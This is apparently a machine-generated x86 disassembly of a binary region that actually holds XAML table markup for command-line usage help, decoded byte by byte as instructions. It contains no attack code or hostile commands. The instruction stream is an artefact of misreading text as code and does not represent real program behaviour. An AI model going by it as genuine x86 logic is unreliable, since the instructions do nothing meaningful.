1100a46e:	outs   dx,DWORD PTR ds:[esi]
1100a46f:	ja     0x1100a4af
1100a471:	or     eax,0x200a0d0a
1100a476:	and    BYTE PTR [eax],ah
1100a478:	and    BYTE PTR [eax],ah
1100a47a:	and    BYTE PTR [esp+edx*2],bh
1100a47d:	popa   
1100a47e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a482:	outs   dx,DWORD PTR ds:[esi]
1100a483:	ja     0x1100a4c3
1100a485:	or     eax,0x2020200a
1100a48a:	and    BYTE PTR [eax],ah
1100a48c:	and    BYTE PTR [eax],ah
1100a48e:	and    BYTE PTR [esp+edx*2],bh
1100a491:	popa   
1100a492:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a496:	gs ins BYTE PTR es:[edi],dx
1100a498:	ins    BYTE PTR es:[edi],dx
1100a499:	ds or  eax,0x2020200a
1100a49f:	and    BYTE PTR [eax],ah
1100a4a1:	and    BYTE PTR [eax],ah
1100a4a3:	and    BYTE PTR [eax],ah
1100a4a5:	and    BYTE PTR [eax+edx*2],bh
1100a4a8:	popa   
1100a4a9:	jb     0x1100a50c
1100a4ab:	addr16 jb 0x1100a50f
1100a4ae:	jo     0x1100a518
1100a4b0:	and    BYTE PTR [esi+0x6f],al
1100a4b3:	jb     0x1100a51a
1100a4b5:	addr16 jb 0x1100a527
1100a4b8:	jne    0x1100a528
1100a4ba:	fs cmp eax,0x756c4222
1100a4c0:	and    bh,BYTE PTR gs:[esi]
1100a4c3:	inc    ebx
1100a4c4:	dec    esp
1100a4c5:	dec    ecx
1100a4c6:	pop    edi
1100a4c7:	push   ebp
1100a4c8:	push   ebx
1100a4c9:	inc    ecx
1100a4ca:	inc    edi
1100a4cb:	inc    ebp
1100a4cc:	pop    edi
1100a4cd:	dec    ebp
1100a4ce:	inc    ecx
1100a4cf:	dec    ebx
1100a4d0:	inc    ebp
1100a4d1:	pop    edi
1100a4d2:	dec    edi
1100a4d3:	push   eax
1100a4d4:	push   esp
1100a4d5:	dec    ecx
1100a4d6:	dec    edi
1100a4d7:	dec    esi
1100a4d8:	cmp    al,0x2f
1100a4da:	push   eax
1100a4db:	popa   
1100a4dc:	jb     0x1100a53f
1100a4de:	addr16 jb 0x1100a542
1100a4e1:	jo     0x1100a54b
1100a4e3:	ds or  eax,0x2020200a
1100a4e9:	and    BYTE PTR [eax],ah
1100a4eb:	and    BYTE PTR [eax],ah
1100a4ed:	and    BYTE PTR [edi+ebp*1],bh
1100a4f0:	push   esp
1100a4f1:	popa   
1100a4f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a4f6:	gs ins BYTE PTR es:[edi],dx
1100a4f8:	ins    BYTE PTR es:[edi],dx
1100a4f9:	ds or  eax,0x2020200a
1100a4ff:	and    BYTE PTR [eax],ah
1100a501:	and    BYTE PTR [eax],ah
1100a503:	and    BYTE PTR [esp+edx*2],bh
1100a506:	popa   
1100a507:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a50b:	gs ins BYTE PTR es:[edi],dx
1100a50d:	ins    BYTE PTR es:[edi],dx
1100a50e:	ds or  eax,0x2020200a
1100a514:	and    BYTE PTR [eax],ah
1100a516:	and    BYTE PTR [eax],ah
1100a518:	and    BYTE PTR [eax],ah
1100a51a:	and    BYTE PTR [eax+edx*2],bh
1100a51d:	popa   
1100a51e:	jb     0x1100a581
1100a520:	addr16 jb 0x1100a584
1100a523:	jo     0x1100a58d
1100a525:	ds inc ebx
1100a527:	dec    esp
1100a528:	dec    ecx
1100a529:	pop    edi
1100a52a:	push   ebp
1100a52b:	push   ebx
1100a52c:	inc    ecx
1100a52d:	inc    edi
1100a52e:	inc    ebp
1100a52f:	pop    edi
1100a530:	dec    ebp
1100a531:	inc    ecx
1100a532:	dec    ebx
1100a533:	inc    ebp
1100a534:	pop    edi
1100a535:	dec    edi
1100a536:	push   eax
1100a537:	push   esp
1100a538:	dec    ecx
1100a539:	dec    edi
1100a53a:	dec    esi
1100a53b:	pop    edi
1100a53c:	inc    esp
1100a53d:	inc    ebp
1100a53e:	push   ebx
1100a53f:	inc    ebx
1100a540:	cmp    al,0x2f
1100a542:	push   eax
1100a543:	popa   
1100a544:	jb     0x1100a5a7
1100a546:	addr16 jb 0x1100a5aa
1100a549:	jo     0x1100a5b3
1100a54b:	ds or  eax,0x2020200a
1100a551:	and    BYTE PTR [eax],ah
1100a553:	and    BYTE PTR [eax],ah
1100a555:	and    BYTE PTR [edi+ebp*1],bh
1100a558:	push   esp
1100a559:	popa   
1100a55a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a55e:	gs ins BYTE PTR es:[edi],dx
1100a560:	ins    BYTE PTR es:[edi],dx
1100a561:	ds or  eax,0x2020200a
1100a567:	and    BYTE PTR [eax],ah
1100a569:	and    BYTE PTR [edi+ebp*1],bh
1100a56c:	push   esp
1100a56d:	popa   
1100a56e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a572:	outs   dx,DWORD PTR ds:[esi]
1100a573:	ja     0x1100a5b3
1100a575:	or     eax,0x200a0d0a
1100a57a:	and    BYTE PTR [eax],ah
1100a57c:	and    BYTE PTR [eax],ah
1100a57e:	and    BYTE PTR [esp+edx*2],bh
1100a581:	popa   
1100a582:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a586:	outs   dx,DWORD PTR ds:[esi]
1100a587:	ja     0x1100a5c7
1100a589:	or     eax,0x2020200a
1100a58e:	and    BYTE PTR [eax],ah
1100a590:	and    BYTE PTR [eax],ah
1100a592:	and    BYTE PTR [esp+edx*2],bh
1100a595:	popa   
1100a596:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a59a:	gs ins BYTE PTR es:[edi],dx
1100a59c:	ins    BYTE PTR es:[edi],dx
1100a59d:	ds or  eax,0x2020200a
1100a5a3:	and    BYTE PTR [eax],ah
1100a5a5:	and    BYTE PTR [eax],ah
1100a5a7:	and    BYTE PTR [eax],ah
1100a5a9:	and    BYTE PTR [eax+edx*2],bh
1100a5ac:	popa   
1100a5ad:	jb     0x1100a610
1100a5af:	addr16 jb 0x1100a613
1100a5b2:	jo     0x1100a61c
1100a5b4:	and    BYTE PTR [esi+0x6f],al
1100a5b7:	jb     0x1100a61e
1100a5b9:	addr16 jb 0x1100a62b
1100a5bc:	jne    0x1100a62c
1100a5be:	fs cmp eax,0x756c4222
1100a5c4:	and    bh,BYTE PTR gs:[esi]
1100a5c7:	inc    ebx
1100a5c8:	dec    esp
1100a5c9:	dec    ecx
1100a5ca:	pop    edi
1100a5cb:	push   ebp
1100a5cc:	push   ebx
1100a5cd:	inc    ecx
1100a5ce:	inc    edi
1100a5cf:	inc    ebp
1100a5d0:	pop    edi
1100a5d1:	inc    esp
1100a5d2:	dec    ecx
1100a5d3:	push   ebx
1100a5d4:	inc    ecx
1100a5d5:	inc    edx
1100a5d6:	dec    esp
1100a5d7:	inc    ebp
1100a5d8:	pop    edi
1100a5d9:	dec    edi
1100a5da:	push   eax
1100a5db:	push   esp
1100a5dc:	dec    ecx
1100a5dd:	dec    edi
1100a5de:	dec    esi
1100a5df:	cmp    al,0x2f
1100a5e1:	push   eax
1100a5e2:	popa   
1100a5e3:	jb     0x1100a646
1100a5e5:	addr16 jb 0x1100a649
1100a5e8:	jo     0x1100a652
1100a5ea:	ds or  eax,0x2020200a
1100a5f0:	and    BYTE PTR [eax],ah
1100a5f2:	and    BYTE PTR [eax],ah
1100a5f4:	and    BYTE PTR [edi+ebp*1],bh
1100a5f7:	push   esp
1100a5f8:	popa   
1100a5f9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a5fd:	gs ins BYTE PTR es:[edi],dx
1100a5ff:	ins    BYTE PTR es:[edi],dx
1100a600:	ds or  eax,0x2020200a
1100a606:	and    BYTE PTR [eax],ah
1100a608:	and    BYTE PTR [eax],ah
1100a60a:	and    BYTE PTR [esp+edx*2],bh
1100a60d:	popa   
1100a60e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a612:	gs ins BYTE PTR es:[edi],dx
1100a614:	ins    BYTE PTR es:[edi],dx
1100a615:	ds or  eax,0x2020200a
1100a61b:	and    BYTE PTR [eax],ah
1100a61d:	and    BYTE PTR [eax],ah
1100a61f:	and    BYTE PTR [eax],ah
1100a621:	and    BYTE PTR [eax+edx*2],bh
1100a624:	popa   
1100a625:	jb     0x1100a688
1100a627:	addr16 jb 0x1100a68b
1100a62a:	jo     0x1100a694
1100a62c:	ds inc ebx
1100a62e:	dec    esp
1100a62f:	dec    ecx
1100a630:	pop    edi
1100a631:	push   ebp
1100a632:	push   ebx
1100a633:	inc    ecx
1100a634:	inc    edi
1100a635:	inc    ebp
1100a636:	pop    edi
1100a637:	inc    esp
1100a638:	dec    ecx
1100a639:	push   ebx
1100a63a:	inc    ecx
1100a63b:	inc    edx
1100a63c:	dec    esp
1100a63d:	inc    ebp
1100a63e:	pop    edi
1100a63f:	dec    edi
1100a640:	push   eax
1100a641:	push   esp
1100a642:	dec    ecx
1100a643:	dec    edi
1100a644:	dec    esi
1100a645:	pop    edi
1100a646:	inc    esp
1100a647:	inc    ebp
1100a648:	push   ebx
1100a649:	inc    ebx
1100a64a:	cmp    al,0x2f
1100a64c:	push   eax
1100a64d:	popa   
1100a64e:	jb     0x1100a6b1
1100a650:	addr16 jb 0x1100a6b4
1100a653:	jo     0x1100a6bd
1100a655:	ds or  eax,0x2020200a
1100a65b:	and    BYTE PTR [eax],ah
1100a65d:	and    BYTE PTR [eax],ah
1100a65f:	and    BYTE PTR [edi+ebp*1],bh
1100a662:	push   esp
1100a663:	popa   
1100a664:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a668:	gs ins BYTE PTR es:[edi],dx
1100a66a:	ins    BYTE PTR es:[edi],dx
1100a66b:	ds or  eax,0x2020200a
1100a671:	and    BYTE PTR [eax],ah
1100a673:	and    BYTE PTR [edi+ebp*1],bh
1100a676:	push   esp
1100a677:	popa   
1100a678:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a67c:	outs   dx,DWORD PTR ds:[esi]
1100a67d:	ja     0x1100a6bd
1100a67f:	or     eax,0x200a0d0a
1100a684:	and    BYTE PTR [eax],ah
1100a686:	and    BYTE PTR [eax],ah
1100a688:	and    BYTE PTR [esp+edx*2],bh
1100a68b:	popa   
1100a68c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a690:	outs   dx,DWORD PTR ds:[esi]
1100a691:	ja     0x1100a6d1
1100a693:	or     eax,0x2020200a
1100a698:	and    BYTE PTR [eax],ah
1100a69a:	and    BYTE PTR [eax],ah
1100a69c:	and    BYTE PTR [esp+edx*2],bh
1100a69f:	popa   
1100a6a0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a6a4:	gs ins BYTE PTR es:[edi],dx
1100a6a6:	ins    BYTE PTR es:[edi],dx
1100a6a7:	ds or  eax,0x2020200a
1100a6ad:	and    BYTE PTR [eax],ah
1100a6af:	and    BYTE PTR [eax],ah
1100a6b1:	and    BYTE PTR [eax],ah
1100a6b3:	and    BYTE PTR [eax+edx*2],bh
1100a6b6:	popa   
1100a6b7:	jb     0x1100a71a
1100a6b9:	addr16 jb 0x1100a71d
1100a6bc:	jo     0x1100a726
1100a6be:	and    BYTE PTR [esi+0x6f],al
1100a6c1:	jb     0x1100a728
1100a6c3:	addr16 jb 0x1100a735
1100a6c6:	jne    0x1100a736
1100a6c8:	fs cmp eax,0x756c4222
1100a6ce:	and    bh,BYTE PTR gs:[esi]
1100a6d1:	inc    ebx
1100a6d2:	dec    esp
1100a6d3:	dec    ecx
1100a6d4:	pop    edi
1100a6d5:	push   ebp
1100a6d6:	push   ebx
1100a6d7:	inc    ecx
1100a6d8:	inc    edi
1100a6d9:	inc    ebp
1100a6da:	pop    edi
1100a6db:	push   ebx
1100a6dc:	dec    ebp
1100a6dd:	inc    ecx
1100a6de:	push   edx
1100a6df:	push   esp
1100a6e0:	pop    edi
1100a6e1:	dec    edi
1100a6e2:	push   eax
1100a6e3:	push   esp
1100a6e4:	dec    ecx
1100a6e5:	dec    edi
1100a6e6:	dec    esi
1100a6e7:	cmp    al,0x2f
1100a6e9:	push   eax
1100a6ea:	popa   
1100a6eb:	jb     0x1100a74e
1100a6ed:	addr16 jb 0x1100a751
1100a6f0:	jo     0x1100a75a
1100a6f2:	ds or  eax,0x2020200a
1100a6f8:	and    BYTE PTR [eax],ah
1100a6fa:	and    BYTE PTR [eax],ah
1100a6fc:	and    BYTE PTR [edi+ebp*1],bh
1100a6ff:	push   esp
1100a700:	popa   
1100a701:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a705:	gs ins BYTE PTR es:[edi],dx
1100a707:	ins    BYTE PTR es:[edi],dx
1100a708:	ds or  eax,0x2020200a
1100a70e:	and    BYTE PTR [eax],ah
1100a710:	and    BYTE PTR [eax],ah
1100a712:	and    BYTE PTR [esp+edx*2],bh
1100a715:	popa   
1100a716:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a71a:	gs ins BYTE PTR es:[edi],dx
1100a71c:	ins    BYTE PTR es:[edi],dx
1100a71d:	ds or  eax,0x2020200a
1100a723:	and    BYTE PTR [eax],ah
1100a725:	and    BYTE PTR [eax],ah
1100a727:	and    BYTE PTR [eax],ah
1100a729:	and    BYTE PTR [eax+edx*2],bh
1100a72c:	popa   
1100a72d:	jb     0x1100a790
1100a72f:	addr16 jb 0x1100a793
1100a732:	jo     0x1100a79c
1100a734:	ds inc ebx
1100a736:	dec    esp
1100a737:	dec    ecx
1100a738:	pop    edi
1100a739:	push   ebp
1100a73a:	push   ebx
1100a73b:	inc    ecx
1100a73c:	inc    edi
1100a73d:	inc    ebp
1100a73e:	pop    edi
1100a73f:	push   ebx
1100a740:	dec    ebp
1100a741:	inc    ecx
1100a742:	push   edx
1100a743:	push   esp
1100a744:	pop    edi
1100a745:	dec    edi
1100a746:	push   eax
1100a747:	push   esp
1100a748:	dec    ecx
1100a749:	dec    edi
1100a74a:	dec    esi
1100a74b:	pop    edi
1100a74c:	inc    esp
1100a74d:	inc    ebp
1100a74e:	push   ebx
1100a74f:	inc    ebx
1100a750:	cmp    al,0x2f
1100a752:	push   eax
1100a753:	popa   
1100a754:	jb     0x1100a7b7
1100a756:	addr16 jb 0x1100a7ba
1100a759:	jo     0x1100a7c3
1100a75b:	ds or  eax,0x2020200a
1100a761:	and    BYTE PTR [eax],ah
1100a763:	and    BYTE PTR [eax],ah
1100a765:	and    BYTE PTR [edi+ebp*1],bh
1100a768:	push   esp
1100a769:	popa   
1100a76a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a76e:	gs ins BYTE PTR es:[edi],dx
1100a770:	ins    BYTE PTR es:[edi],dx
1100a771:	ds or  eax,0x2020200a
1100a777:	and    BYTE PTR [eax],ah
1100a779:	and    BYTE PTR [edi+ebp*1],bh
1100a77c:	push   esp
1100a77d:	popa   
1100a77e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a782:	outs   dx,DWORD PTR ds:[esi]
1100a783:	ja     0x1100a7c3
1100a785:	or     eax,0x200a0d0a
1100a78a:	and    BYTE PTR [eax],ah
1100a78c:	and    BYTE PTR [eax],ah
1100a78e:	and    BYTE PTR [esp+edx*2],bh
1100a791:	popa   
1100a792:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a796:	outs   dx,DWORD PTR ds:[esi]
1100a797:	ja     0x1100a7d7
1100a799:	or     eax,0x2020200a
1100a79e:	and    BYTE PTR [eax],ah
1100a7a0:	and    BYTE PTR [eax],ah
1100a7a2:	and    BYTE PTR [esp+edx*2],bh
1100a7a5:	popa   
1100a7a6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a7aa:	gs ins BYTE PTR es:[edi],dx
1100a7ac:	ins    BYTE PTR es:[edi],dx
1100a7ad:	ds or  eax,0x2020200a
1100a7b3:	and    BYTE PTR [eax],ah
1100a7b5:	and    BYTE PTR [eax],ah
1100a7b7:	and    BYTE PTR [eax],ah
1100a7b9:	and    BYTE PTR [eax+edx*2],bh
1100a7bc:	popa   
1100a7bd:	jb     0x1100a820
1100a7bf:	addr16 jb 0x1100a823
1100a7c2:	jo     0x1100a82c
1100a7c4:	and    BYTE PTR [esi+0x6f],al
1100a7c7:	jb     0x1100a82e
1100a7c9:	addr16 jb 0x1100a83b
1100a7cc:	jne    0x1100a83c
1100a7ce:	fs cmp eax,0x756c4222
1100a7d4:	and    bh,BYTE PTR gs:[esi]
1100a7d7:	inc    ebx
1100a7d8:	dec    esp
1100a7d9:	dec    ecx
1100a7da:	pop    edi
1100a7db:	push   ebp
1100a7dc:	push   ebx
1100a7dd:	inc    ecx
1100a7de:	inc    edi
1100a7df:	inc    ebp
1100a7e0:	pop    edi
1100a7e1:	push   ebx
1100a7e2:	dec    ebp
1100a7e3:	inc    ecx
1100a7e4:	push   edx
1100a7e5:	push   esp
1100a7e6:	pop    edi
1100a7e7:	push   esi
1100a7e8:	inc    ebp
1100a7e9:	push   edx
1100a7ea:	inc    edx
1100a7eb:	dec    edi
1100a7ec:	push   ebx
1100a7ed:	dec    ecx
1100a7ee:	push   esp
1100a7ef:	pop    ecx
1100a7f0:	pop    edi
1100a7f1:	dec    edi
1100a7f2:	push   eax
1100a7f3:	push   esp
1100a7f4:	dec    ecx
1100a7f5:	dec    edi
1100a7f6:	dec    esi
1100a7f7:	cmp    al,0x2f
1100a7f9:	push   eax
1100a7fa:	popa   
1100a7fb:	jb     0x1100a85e
1100a7fd:	addr16 jb 0x1100a861
1100a800:	jo     0x1100a86a
1100a802:	ds or  eax,0x2020200a
1100a808:	and    BYTE PTR [eax],ah
1100a80a:	and    BYTE PTR [eax],ah
1100a80c:	and    BYTE PTR [edi+ebp*1],bh
1100a80f:	push   esp
1100a810:	popa   
1100a811:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a815:	gs ins BYTE PTR es:[edi],dx
1100a817:	ins    BYTE PTR es:[edi],dx
1100a818:	ds or  eax,0x2020200a
1100a81e:	and    BYTE PTR [eax],ah
1100a820:	and    BYTE PTR [eax],ah
1100a822:	and    BYTE PTR [esp+edx*2],bh
1100a825:	popa   
1100a826:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a82a:	gs ins BYTE PTR es:[edi],dx
1100a82c:	ins    BYTE PTR es:[edi],dx
1100a82d:	ds or  eax,0x2020200a
1100a833:	and    BYTE PTR [eax],ah
1100a835:	and    BYTE PTR [eax],ah
1100a837:	and    BYTE PTR [eax],ah
1100a839:	and    BYTE PTR [eax+edx*2],bh
1100a83c:	popa   
1100a83d:	jb     0x1100a8a0
1100a83f:	addr16 jb 0x1100a8a3
1100a842:	jo     0x1100a8ac
1100a844:	ds inc ebx
1100a846:	dec    esp
1100a847:	dec    ecx
1100a848:	pop    edi
1100a849:	push   ebp
1100a84a:	push   ebx
1100a84b:	inc    ecx
1100a84c:	inc    edi
1100a84d:	inc    ebp
1100a84e:	pop    edi
1100a84f:	push   ebx
1100a850:	dec    ebp
1100a851:	inc    ecx
1100a852:	push   edx
1100a853:	push   esp
1100a854:	pop    edi
1100a855:	push   esi
1100a856:	inc    ebp
1100a857:	push   edx
1100a858:	inc    edx
1100a859:	dec    edi
1100a85a:	push   ebx
1100a85b:	dec    ecx
1100a85c:	push   esp
1100a85d:	pop    ecx
1100a85e:	pop    edi
1100a85f:	dec    edi
1100a860:	push   eax
1100a861:	push   esp
1100a862:	dec    ecx
1100a863:	dec    edi
1100a864:	dec    esi
1100a865:	pop    edi
1100a866:	inc    esp
1100a867:	inc    ebp
1100a868:	push   ebx
1100a869:	inc    ebx
1100a86a:	cmp    al,0x2f
1100a86c:	push   eax
1100a86d:	popa   
1100a86e:	jb     0x1100a8d1
1100a870:	addr16 jb 0x1100a8d4
1100a873:	jo     0x1100a8dd
1100a875:	ds or  eax,0x2020200a
1100a87b:	and    BYTE PTR [eax],ah
1100a87d:	and    BYTE PTR [eax],ah
1100a87f:	and    BYTE PTR [edi+ebp*1],bh
1100a882:	push   esp
1100a883:	popa   
1100a884:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a888:	gs ins BYTE PTR es:[edi],dx
1100a88a:	ins    BYTE PTR es:[edi],dx
1100a88b:	ds or  eax,0x2020200a
1100a891:	and    BYTE PTR [eax],ah
1100a893:	and    BYTE PTR [edi+ebp*1],bh
1100a896:	push   esp
1100a897:	popa   
1100a898:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a89c:	outs   dx,DWORD PTR ds:[esi]
1100a89d:	ja     0x1100a8dd
1100a89f:	or     eax,0x2020200a
1100a8a4:	and    BYTE PTR [eax],ah
1100a8a6:	and    BYTE PTR [esp+edx*2],bh
1100a8a9:	popa   
1100a8aa:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a8ae:	outs   dx,DWORD PTR ds:[esi]
1100a8af:	ja     0x1100a8ef
1100a8b1:	or     eax,0x2020200a
1100a8b6:	and    BYTE PTR [eax],ah
1100a8b8:	and    BYTE PTR [eax],ah
1100a8ba:	and    BYTE PTR [esp+edx*2],bh
1100a8bd:	popa   
1100a8be:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a8c2:	gs ins BYTE PTR es:[edi],dx
1100a8c4:	ins    BYTE PTR es:[edi],dx
1100a8c5:	and    BYTE PTR [ebx+0x6f],al
1100a8c8:	ins    BYTE PTR es:[edi],dx
1100a8c9:	jne    0x1100a938
1100a8cb:	outs   dx,BYTE PTR ds:[esi]
1100a8cc:	push   ebx
1100a8cd:	jo     0x1100a930
1100a8cf:	outs   dx,BYTE PTR ds:[esi]
1100a8d0:	cmp    eax,0x3e223222
1100a8d5:	or     eax,0x2020200a
1100a8da:	and    BYTE PTR [eax],ah
1100a8dc:	and    BYTE PTR [eax],ah
1100a8de:	and    BYTE PTR [edi+ebp*1],bh
1100a8e1:	push   esp
1100a8e2:	popa   
1100a8e3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a8e7:	gs ins BYTE PTR es:[edi],dx
1100a8e9:	ins    BYTE PTR es:[edi],dx
1100a8ea:	ds or  eax,0x2020200a
1100a8f0:	and    BYTE PTR [eax],ah
1100a8f2:	and    BYTE PTR [edi+ebp*1],bh
1100a8f5:	push   esp
1100a8f6:	popa   
1100a8f7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a8fb:	outs   dx,DWORD PTR ds:[esi]
1100a8fc:	ja     0x1100a93c
1100a8fe:	or     eax,0x200a0d0a
1100a903:	and    BYTE PTR [eax],ah
1100a905:	and    BYTE PTR [eax],ah
1100a907:	and    BYTE PTR [esp+edx*2],bh
1100a90a:	popa   
1100a90b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a90f:	outs   dx,DWORD PTR ds:[esi]
1100a910:	ja     0x1100a950
1100a912:	or     eax,0x2020200a
1100a917:	and    BYTE PTR [eax],ah
1100a919:	and    BYTE PTR [eax],ah
1100a91b:	and    BYTE PTR [esp+edx*2],bh
1100a91e:	popa   
1100a91f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a923:	gs ins BYTE PTR es:[edi],dx
1100a925:	ins    BYTE PTR es:[edi],dx
1100a926:	and    BYTE PTR [ebx+0x6f],al
1100a929:	ins    BYTE PTR es:[edi],dx
1100a92a:	jne    0x1100a999
1100a92c:	outs   dx,BYTE PTR ds:[esi]
1100a92d:	push   ebx
1100a92e:	jo     0x1100a991
1100a930:	outs   dx,BYTE PTR ds:[esi]
1100a931:	cmp    eax,0x3e223222
1100a936:	or     eax,0x2020200a
1100a93b:	and    BYTE PTR [eax],ah
1100a93d:	and    BYTE PTR [eax],ah
1100a93f:	and    BYTE PTR [edi+ebp*1],bh
1100a942:	push   esp
1100a943:	popa   
1100a944:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a948:	gs ins BYTE PTR es:[edi],dx
1100a94a:	ins    BYTE PTR es:[edi],dx
1100a94b:	ds or  eax,0x2020200a
1100a951:	and    BYTE PTR [eax],ah
1100a953:	and    BYTE PTR [edi+ebp*1],bh
1100a956:	push   esp
1100a957:	popa   
1100a958:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a95c:	outs   dx,DWORD PTR ds:[esi]
1100a95d:	ja     0x1100a99d
1100a95f:	or     eax,0x200a0d0a
1100a964:	and    BYTE PTR [eax],ah
1100a966:	and    BYTE PTR [edi+ebp*1],bh
1100a969:	push   esp
1100a96a:	popa   
1100a96b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a96f:	outs   dx,DWORD PTR ds:[esi]
1100a970:	ja     0x1100a9b9
1100a972:	jb     0x1100a9e3
1100a974:	jne    0x1100a9e6
1100a976:	ds or  eax,0x90a0d0a
1100a97c:	and    BYTE PTR [eax],ah
1100a97e:	cmp    al,0x54
1100a980:	popa   
1100a981:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a985:	outs   dx,DWORD PTR ds:[esi]
1100a986:	ja     0x1100a9cf
1100a988:	jb     0x1100a9f9
1100a98a:	jne    0x1100a9fc
1100a98c:	and    BYTE PTR [ebx+0x74],dl
1100a98f:	jns    0x1100a9fd
1100a991:	gs cmp eax,0x74537b22
1100a997:	popa   
1100a998:	je     0x1100aa03
1100a99a:	arpl   WORD PTR [edx+0x65],dx
1100a99d:	jae    0x1100aa0e
1100a99f:	jne    0x1100aa13
1100a9a1:	arpl   WORD PTR [ebp+0x20],sp
1100a9a4:	push   0x65646165
1100a9a9:	jb     0x1100a9f1
1100a9ab:	outs   dx,DWORD PTR ds:[esi]
1100a9ac:	outs   dx,DWORD PTR ds:[esi]
1100a9ad:	je     0x1100aa14
1100a9af:	jb     0x1100aa03
1100a9b1:	outs   dx,DWORD PTR ds:[esi]
1100a9b2:	ja     0x1100aa07
1100a9b4:	je     0x1100aa2f
1100a9b6:	ins    BYTE PTR es:[edi],dx
1100a9b7:	gs jge 0x1100a9dc
1100a9ba:	ds or  eax,0x2009090a
1100a9c0:	and    BYTE PTR [esp+edx*2],bh
1100a9c3:	popa   
1100a9c4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100a9c8:	outs   dx,DWORD PTR ds:[esi]
1100a9c9:	ja     0x1100aa09
1100a9cb:	or     eax,0x909090a
1100a9d0:	and    BYTE PTR [eax],ah
1100a9d2:	cmp    al,0x54
1100a9d4:	popa   
1100a9d5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100a9d9:	gs ins BYTE PTR es:[edi],dx
1100a9db:	ins    BYTE PTR es:[edi],dx
1100a9dc:	and    BYTE PTR [ebx+0x6f],al
1100a9df:	ins    BYTE PTR es:[edi],dx
1100a9e0:	jne    0x1100aa4f
1100a9e2:	outs   dx,BYTE PTR ds:[esi]
1100a9e3:	push   ebx
1100a9e4:	jo     0x1100aa47
1100a9e6:	outs   dx,BYTE PTR ds:[esi]
1100a9e7:	cmp    eax,0x3e223222
1100a9ec:	or     eax,0x909090a
1100a9f1:	or     DWORD PTR [eax],esp
1100a9f3:	and    BYTE PTR [eax+edx*2],bh
1100a9f6:	popa   
1100a9f7:	jb     0x1100aa5a
1100a9f9:	addr16 jb 0x1100aa5d
1100a9fc:	jo     0x1100aa66
1100a9fe:	ds inc ebx
1100aa00:	dec    esp
1100aa01:	dec    ecx
1100aa02:	pop    edi
1100aa03:	push   ebp
1100aa04:	push   ebx
1100aa05:	inc    ecx
1100aa06:	inc    edi
1100aa07:	inc    ebp
1100aa08:	pop    edi
1100aa09:	inc    ebp
1100aa0a:	pop    eax
1100aa0b:	push   esp
1100aa0c:	pop    edi
1100aa0d:	push   eax
1100aa0e:	push   edx
1100aa0f:	dec    edi
1100aa10:	pop    edi
1100aa11:	dec    edi
1100aa12:	push   eax
1100aa13:	push   esp
1100aa14:	dec    ecx
1100aa15:	dec    edi
1100aa16:	dec    esi
1100aa17:	push   ebx
1100aa18:	cmp    al,0x2f
1100aa1a:	push   eax
1100aa1b:	popa   
1100aa1c:	jb     0x1100aa7f
1100aa1e:	addr16 jb 0x1100aa82
1100aa21:	jo     0x1100aa8b
1100aa23:	ds or  eax,0x909090a
1100aa29:	and    BYTE PTR [eax],ah
1100aa2b:	cmp    al,0x2f
1100aa2d:	push   esp
1100aa2e:	popa   
1100aa2f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100aa33:	gs ins BYTE PTR es:[edi],dx
1100aa35:	ins    BYTE PTR es:[edi],dx
1100aa36:	ds or  eax,0x2009090a
1100aa3c:	and    BYTE PTR [edi+ebp*1],bh
1100aa3f:	push   esp
1100aa40:	popa   
1100aa41:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100aa45:	outs   dx,DWORD PTR ds:[esi]
1100aa46:	ja     0x1100aa86
1100aa48:	or     eax,0x2020090a
1100aa4d:	cmp    al,0x2f
1100aa4f:	push   esp
1100aa50:	popa   
1100aa51:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100aa55:	outs   dx,DWORD PTR ds:[esi]
1100aa56:	ja     0x1100aa9f
1100aa58:	jb     0x1100aac9
1100aa5a:	jne    0x1100aacc
1100aa5c:	ds or  eax,0x90a0d0a
1100aa62:	and    BYTE PTR [eax],ah
1100aa64:	cmp    al,0x54
1100aa66:	popa   
1100aa67:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100aa6b:	outs   dx,DWORD PTR ds:[esi]
1100aa6c:	ja     0x1100aab5
1100aa6e:	jb     0x1100aadf
1100aa70:	jne    0x1100aae2
1100aa72:	and    BYTE PTR [ebx+0x74],dl
